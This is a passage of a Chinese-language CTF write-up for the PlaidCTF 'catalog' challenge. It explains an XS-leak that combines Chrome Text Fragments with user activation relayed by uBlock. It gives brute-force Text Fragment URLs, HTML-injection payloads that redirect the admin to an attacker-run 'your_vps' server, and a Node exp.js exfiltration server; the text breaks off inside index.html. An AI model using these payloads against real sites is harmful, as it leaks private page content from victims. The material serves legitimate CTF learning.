76&#x4EE5;&#x540E;&#x7684;&#x7248;&#x672C;&#x90FD;&#x5DF2;&#x5B9E;&#x73B0;&#x4E86;&#x8BE5;&#x529F;&#x80FD;&#x2014;&#x2014;<a href="https://chromestatus.com/feature/5645767347798016" target="_blank" rel="noopener">Lazily load iframes and images via &#x2018;loading&#x2019; attribute</a></p></blockquote><p>&#x81F3;&#x6B64;&#xFF0C;&#x57FA;&#x672C;&#x4E0A;&#x6BD4;&#x8F83;&#x5173;&#x952E;&#x7684;&#x5730;&#x65B9;&#x6211;&#x4EEC;&#x90FD;&#x8BF4;&#x5B8C;&#x4E86;&#xFF0C;&#x5269;&#x4E0B;&#x7684;&#x5C31;&#x662F;&#x5B9E;&#x73B0;&#x4EE5;&#x53CA;&#x4E00;&#x4E9B;&#x7EC6;&#x8282;&#x7684;&#x5730;&#x65B9;&#x4E86;&#x3002;</p><h3 id="uBlock-amp-User-Activation-amp-Text-Fragments"><a href="#uBlock-amp-User-Activation-amp-Text-Fragments" class="headerlink" title="uBlock &amp; User Activation &amp; Text Fragments"></a>uBlock &amp; User Activation &amp; Text Fragments</h3><p>&#x8FD9;&#x65F6;&#x6211;&#x4EEC;&#x518D;&#x6765;&#x56DE;&#x5934;&#x770B; uBlock &amp; User Activation &#x5728;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x8D77;&#x5230;&#x4E86;&#x4EC0;&#x4E48;&#x4F5C;&#x7528;&#x5462;&#xFF1F;</p><p>&#x56E0;&#x4E3A; Chrome 80 &#x5F15;&#x5165;&#x4E86; Text Fragments &#x7684;&#x673A;&#x5236;&#xFF0C;&#x7EFC;&#x4E0A;&#x6211;&#x4EEC;&#x7684;&#x5206;&#x6790;&#x5229;&#x7528;&#x53EF;&#x4EE5;&#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x653B;&#x51FB;&#x9762;&#xFF0C;&#x7528;&#x8FD9;&#x79CD;&#x201C;&#x4FA7;&#x4FE1;&#x9053;&#x201D;&#x7684;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7A83;&#x53D6;&#x7528;&#x6237;&#x9690;&#x79C1;&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x7136;&#x51FA;&#x4E8E;&#x9690;&#x79C1;&#x8003;&#x8651;&#xFF0C; Google &#x4E5F;&#x5F15;&#x5165;&#x4E86;&#x76F8;&#x5BF9;&#x7684;&#x9650;&#x5236;&#x673A;&#x5236;&#xFF1A;</p><blockquote><p>The following subsections restrict the feature to mitigate the expected attack vectors. In summary, the text fragment directives are invoked only on full (non-same-page) navigations that are the result of a user activation. Additionally, navigations originating from a different origin than the destination will require the navigation to take place in a &#x201C;noopener&#x201D; context, such that the destination page is known to be sufficiently isolated.</p></blockquote><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6CE8;&#x610F;&#x5230;&#x5176;&#x4E2D;&#x975E;&#x5E38;&#x5173;&#x952E;&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#xFF1A; <em>*<em>In summary, the text fragment directives are invoked only on full navigations that are the result of a user activation. *</em></em></p><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4; Text Fragments &#x529F;&#x80FD;&#x4EC5;&#x5728;&#x7531;&#x4E8E; User Activation &#x4EA7;&#x751F;&#x7684;&#x5B8C;&#x6574;&#x5BFC;&#x5411;&#x4E0A;&#x624D;&#x80FD;&#x751F;&#x6548;&#xFF0C;&#x6CA1;&#x6709; User Activation &#x662F;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#x8BE5;&#x529F;&#x80FD;&#x7684;&#xFF01;&#x5728;&#x5176;&#x4ED6;&#x5730;&#x65B9;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x5230; Google &#x5BF9;&#x4E8E; *<em>User Activation *</em> &#x505A;&#x4E86;&#x5F88;&#x591A;&#x7684;&#x5F3A;&#x8C03;&#xFF1A;</p><blockquote><p>The examples above illustrate that in specific circumstances, it may be possible for an attacker to extract 1 bit of information about content on the page. However, care must be taken so that such opportunities cannot be exploited to extract arbitrary content from the page by repeating the attack. For this reason, restrictions based on user activation and browsing context isolation are very important and must be implemented.</p></blockquote><p><em><strong>For this reason, restrictions based on user activation and browsing context isolation are very important and must be implemented.</strong></em></p><p>&#x56E0;&#x6B64;&#xFF0C;&#x57FA;&#x4E8E; User Activation &#x548C;&#x6D4F;&#x89C8;&#x4E0A;&#x4E0B;&#x6587;&#x9694;&#x79BB;&#x7684;&#x9650;&#x5236;&#x975E;&#x5E38;&#x91CD;&#x8981;&#xFF0C;&#x5FC5;&#x987B;&#x4E88;&#x4EE5;&#x5B9E;&#x65BD;&#x3002;</p><p>&#x81F3;&#x4E8E; Chrome &#x5982;&#x4F55;&#x5B9E;&#x73B0;&#x9650;&#x5236;&#x8BE5;&#x529F;&#x80FD;&#x7684;&#xFF0C;&#x5177;&#x4F53;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x6587;&#x6863; <a href="https://wicg.github.io/ScrollToTextFragment/#restricting-the-text-fragment" target="_blank" rel="noopener">Restricting the Text Fragment</a> &#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x8BE6;&#x8FF0;&#x4E86;&#x3002;</p><p>&#x4ECE;&#x4EE5;&#x4E0A;&#x6765;&#x770B;&#xFF0C;&#x51FA;&#x9898;&#x4EBA;&#x7684;&#x9898;&#x56FE;&#x5C31;&#x5F88;&#x660E;&#x663E;&#x4E86;&#xFF1A;</p><blockquote><p>Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.</p></blockquote><p>&#x5E76;&#x4E14;&#x6839;&#x636E; <a href="https://docs.google.com/document/d/1erpl1yqJlc1pH0QvVVmi1s3WzqQLsEXTLLh6VuYp228/" target="_blank" rel="noopener">User Activation v2 in Chrome</a> &#xFF1A;</p><blockquote><p>Full-overlay request from subframes: To grant a subframe&#x2019;s full-overlay request (sent through a postMessage), the main frame will check the subframe&#x2019;s HasConsumableUserActivation bit and will consume it. If we expose the frame states through read-only Boolean properties of HTMLIFrameElement (or Document), the main frame can access the info through the postMessage&#x2019;s <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank" rel="noopener">event source</a> parameter.</p></blockquote><p>&#x4E24;&#x8005;&#x7ED3;&#x5408;&#x5728;&#x4E00;&#x8D77;&#x53EF;&#x80FD;&#x5C31;&#x6BD4;&#x8F83;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#x4E86;&#xFF0C;<strong>&#x4EE5;&#x4E0B;&#x662F;&#x4E2A;&#x4EBA;&#x6839;&#x636E;&#x6587;&#x6863;&#x7406;&#x89E3;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x53C2;&#x8003;&#x7814;&#x7A76;&#x5177;&#x4F53;&#x4EE3;&#x7801;&#x5B9E;&#x73B0;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x5E08;&#x5085;&#x6839;&#x636E;&#x4EE3;&#x7801;&#x7814;&#x7A76;&#x51FA;&#x7ED3;&#x679C;&#x4E0E;&#x6211;&#x7684;&#x7406;&#x89E3;&#x6709;&#x4EC0;&#x4E48;&#x51FA;&#x5165;&#xFF0C;&#x90A3;&#x4E00;&#x5B9A;&#x662F;&#x6211;&#x9519;&#x4E86;</strong>&#xFF1A;</p><p>&#x4E2A;&#x4EBA;&#x7406;&#x89E3;&#xFF1A;&#x7BA1;&#x7406;&#x5458;&#x5355;&#x51FB;&#x4E00;&#x4E2A;&#x6211;&#x4EEC;&#x63D0;&#x4EA4;&#x6253;&#x7684;&#x94FE;&#x63A5;&#xFF0C;&#x5C06;&#x6D88;&#x8017;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x6253;&#x5F00;&#x94FE;&#x63A5;&#xFF0C;&#x800C; uBlock &#x5C06; <code>postMessage</code> &#x53D1;&#x9001;&#x5230;&#x5176;&#x6269;&#x5C55; iframe &#xFF0C;&#x4ECE;&#x800C;&#x590D;&#x5236;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x3002; &#x6BCF;&#x5F53;&#x9875;&#x9762;&#x52A0;&#x8F7D;&#x65F6;&#xFF0C;&#x524D;&#x7AEF;&#x90FD;&#x4F1A;&#x4ECE; uBlock &#x6846;&#x67B6;&#x83B7;&#x53D6; postMessage &#xFF0C;&#x4ECE;&#x800C;&#x518D;&#x6B21;&#x5C06;&#x6FC0;&#x6D3B;&#x590D;&#x5236;&#x56DE;&#x53BB;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4ECE; <a href="#Verification">Verification</a> &#x770B;&#x5230;&#x5173;&#x4E8E; uBlock &#x4F20;&#x9012; User Activation &#x7684;&#x9A8C;&#x8BC1;&#x3002;</p><h3 id="Regex"><a href="#Regex" class="headerlink" title="Regex"></a>Regex</h3><p>&#x56E0;&#x4E3A; FLAG &#x6B63;&#x5219;&#x4E3A; <code>/^PCTF\{[A-Z0-9_]+\}$/</code>&#xFF0C;&#x6211;&#x4EEC;&#x6BCF;&#x6B21;&#x7528; Text Fragments &#x53EA;&#x80FD;&#x9A8C;&#x8BC1;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x4F8B;&#x5982;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x5982;&#x4E0B; url &#xFF0C;&#x4E00;&#x6B21;&#x53EF;&#x4EE5;&#x5339;&#x914D;&#x5B8C;&#x5168;&#x90E8;&#x7684;&#x7B26;&#x5408;&#x6B63;&#x5219;&#x7684;&#x5B57;&#x7B26;&#xFF0C;A-Z0-9_ &#x5916;&#x52A0;&#x4E00;&#x4E2A; } &#x4E3A; FLAG &#x95ED;&#x5408;&#x7684;&#x5B57;&#x7B26;</p><p></p><figure class="highlight excel hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ht<span class="hljs-symbol">tp:</span>//catalog.pwni.ng/issue.php?id=<span class="hljs-number">3</span>#<span class="hljs-symbol">:</span>~<span class="hljs-symbol">:te</span>xt=<span class="hljs-built_in">T</span>-,F,{,-}%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">0%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">1%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">2%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">3%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">4%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">5%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">6%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">7%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">8%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">9%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-A%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-B%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-D%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-E%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-F%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-G%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-H%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-I%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-J%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-K%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-L%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-M%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-built_in">N</span>%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-O%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-P%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-Q%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-R%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-S%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-built_in">T</span>%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-U%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-V%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-W%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-X%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-Y%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-Z%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-_</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x5339;&#x914D;&#x4E86;&#xFF0C;&#x5219;&#x53BB;&#x6389;&#x4E00;&#x534A;&#x7684;&#x5B57;&#x7B26;&#xFF0C;&#x91C7;&#x7528;&#x4E8C;&#x5206;&#x7684;&#x5F62;&#x5F0F;&#x7F29;&#x5C0F;&#x6211;&#x4EEC;&#x7684;&#x5339;&#x914D;&#x8303;&#x56F4;&#xFF0C;&#x6240;&#x4EE5;&#x4E0B;&#x4E00;&#x6B21;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x9001;&#x7684;&#x662F;</p><p></p><figure class="highlight excel hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ht<span class="hljs-symbol">tp:</span>//catalog.pwni.ng/issue.php?id=<span class="hljs-number">3</span>#<span class="hljs-symbol">:</span>~<span class="hljs-symbol">:te</span>xt=<span class="hljs-built_in">T</span>-,F,{,-}%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">0%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">1%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">2%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">3%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">4%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">5%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">6%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">7%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">8%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">9%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-A%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-B%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-D%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-E%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-F%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-G%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-H%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-I</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x5339;&#x914D;&#x4E86;&#xFF0C;&#x5C31;&#x7EE7;&#x7EED;&#x5728;&#x8FD9;&#x4E2A;&#x8303;&#x56F4;&#x4E8C;&#x5206;&#xFF0C;&#x4E0D;&#x5339;&#x914D;&#x5C31;&#x7528;&#x53E6;&#x4E00;&#x4E2A;&#x8303;&#x56F4;</p><h3 id="Reproduce"><a href="#Reproduce" class="headerlink" title="Reproduce"></a>Reproduce</h3><p>&#x8FD9;&#x4E2A;&#x90E8;&#x5206;&#x5C31;&#x53EA;&#x662F;&#x63D0;&#x4F9B;&#x590D;&#x73B0;&#x7684;&#x6B65;&#x9AA4;&#xFF0C;&#x4E0B;&#x4E2A;&#x90E8;&#x5206;&#x63D0;&#x4F9B;&#x8BE6;&#x7EC6;&#x7684;&#x653B;&#x51FB;&#x94FE;&#x89E3;&#x91CA;&#xFF1A;</p><ol><li><p>&#x6CE8;&#x518C;&#x4E00;&#x4E2A;&#x8D26;&#x53F7;&#xFF0C;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; issue &#xFF0C;&#x5E76;&#x8BB0;&#x5F55;&#x8BE5; issue &#x7684;&#x6570;&#x5B57; id&#xFF0C;&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x8FA8;&#x8BC6;&#xFF0C;&#x8BE5;&#x6570;&#x5B57; id &#x6211;&#x4EEC;&#x79F0;&#x4E3A; issue_id_1 &#xFF0C;post http &#x5305;&#x7684; body &#x5185;&#x5BB9;&#x4E3A;&#xFF1A;</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">id</span>=issue_id_1&amp;title=3&amp;content=1&amp;image=z&quot;/&gt;&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;http://your_vps/fragment&quot;</span>&gt;&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span>+content=&quot;0;URL=&apos;http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}%<span class="hljs-attribute">26text</span>=T-,F,{,-0%<span class="hljs-attribute">26text</span>=T-,F,{,-1%<span class="hljs-attribute">26text</span>=T-,F,{,-2%<span class="hljs-attribute">26text</span>=T-,F,{,-3%<span class="hljs-attribute">26text</span>=T-,F,{,-4%<span class="hljs-attribute">26text</span>=T-,F,{,-5%<span class="hljs-attribute">26text</span>=T-,F,{,-6%<span class="hljs-attribute">26text</span>=T-,F,{,-7%<span class="hljs-attribute">26text</span>=T-,F,{,-8%<span class="hljs-attribute">26text</span>=T-,F,{,-9%<span class="hljs-attribute">26text</span>=T-,F,{,-A%<span class="hljs-attribute">26text</span>=T-,F,{,-B%<span class="hljs-attribute">26text</span>=T-,F,{,-D%<span class="hljs-attribute">26text</span>=T-,F,{,-E%<span class="hljs-attribute">26text</span>=T-,F,{,-F%<span class="hljs-attribute">26text</span>=T-,F,{,-G%<span class="hljs-attribute">26text</span>=T-,F,{,-H%<span class="hljs-attribute">26text</span>=T-,F,{,-I%<span class="hljs-attribute">26text</span>=T-,F,{,-J%<span class="hljs-attribute">26text</span>=T-,F,{,-K%<span class="hljs-attribute">26text</span>=T-,F,{,-L%<span class="hljs-attribute">26text</span>=T-,F,{,-M%<span class="hljs-attribute">26text</span>=T-,F,{,-N%<span class="hljs-attribute">26text</span>=T-,F,{,-O%<span class="hljs-attribute">26text</span>=T-,F,{,-P%<span class="hljs-attribute">26text</span>=T-,F,{,-Q%<span class="hljs-attribute">26text</span>=T-,F,{,-R%<span class="hljs-attribute">26text</span>=T-,F,{,-S%<span class="hljs-attribute">26text</span>=T-,F,{,-T%<span class="hljs-attribute">26text</span>=T-,F,{,-U%<span class="hljs-attribute">26text</span>=T-,F,{,-V%<span class="hljs-attribute">26text</span>=T-,F,{,-W%<span class="hljs-attribute">26text</span>=T-,F,{,-X%<span class="hljs-attribute">26text</span>=T-,F,{,-Y%<span class="hljs-attribute">26text</span>=T-,F,{,-Z%<span class="hljs-attribute">26text</span>=T-,F,{,-_<span class="hljs-string">&apos;&quot;&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>&#x518D;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; issue &#xFF0C; &#x5E76;&#x8BB0;&#x5F55;&#x8BE5; issue &#x7684;&#x6570;&#x5B57; id&#xFF0C;&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x8FA8;&#x8BC6;&#xFF0C;&#x8BE5;&#x6570;&#x5B57; id &#x6211;&#x4EEC;&#x79F0;&#x4E3A; issue_id_2&#xFF0C;post http &#x5305;&#x7684; body &#x5185;&#x5BB9;&#x4E3A;&#xFF1A;</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">id</span>=issue_id_2&amp;title=3&amp;content=1&amp;image=&quot;&gt;&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;0;URL=&apos;http://your_vps/&apos;&quot;</span>&gt;&quot;</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>&#x81EA;&#x5DF1;&#x7684; vps &#x4E0A;&#x7528; node &#x8FD0;&#x884C;&#x5982;&#x4E0B; exp.js</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> status = <span class="hljs-literal">false</span>;</span><br><span class="line"><span class="hljs-keyword">let</span> unlock = <span class="hljs-literal">false</span>;</span><br><span class="line"><span class="hljs-keyword">let</span> match = <span class="hljs-literal">false</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/status&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    res.send(<span class="hljs-string">`<span class="hljs-subst">${status}</span>`</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/unlock&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    unlock = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">&quot;unlock&quot;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/firstload&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; Admin opened challenge&apos;s page&quot;</span>);</span><br><span class="line">    res.send(<span class="hljs-string">&quot;firstload&quot;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; Admin was redirected to attacker&apos;s page&quot;</span>);</span><br><span class="line">    res.sendFile(<span class="hljs-string">&quot;index.html&quot;</span>, {</span><br><span class="line">        root: __dirname</span><br><span class="line">    });</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/injection&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; HTML injection was inserted into id=3 catalog&quot;</span>);</span><br><span class="line">    setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {</span><br><span class="line">        <span class="hljs-keyword">if</span> (match) <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; There was a match&quot;</span>);</span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; There wasn&apos;t a match&quot;</span>);</span><br><span class="line">        match = <span class="hljs-literal">false</span>;</span><br><span class="line">        unlock = <span class="hljs-literal">false</span>;</span><br><span class="line">        status = <span class="hljs-literal">false</span>;</span><br><span class="line">    }, <span class="hljs-number">1000</span>);</span><br><span class="line">    res.send(<span class="hljs-string">&quot;injection&quot;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/exfiltrated&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    match = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">&quot;exfiltrated&quot;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/fragment&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    status = <span class="hljs-literal">true</span>;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; Admin was fragmented&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">let</span> timer = setInterval(<span class="hljs-keyword">async</span> () =&gt; {</span><br><span class="line">        <span class="hljs-keyword">if</span> (unlock) {</span><br><span class="line">            res.send(<span class="hljs-string">&quot;fragment&quot;</span>);</span><br><span class="line">            clearInterval(timer);</span><br><span class="line">        }</span><br><span class="line">    }, <span class="hljs-number">1</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.listen(port);</span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Server running on port: &quot;</span> + port);</span><br></pre></td></tr></tbody></table></figure><p></p><p>index.html:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Psst! Get out of here...<span 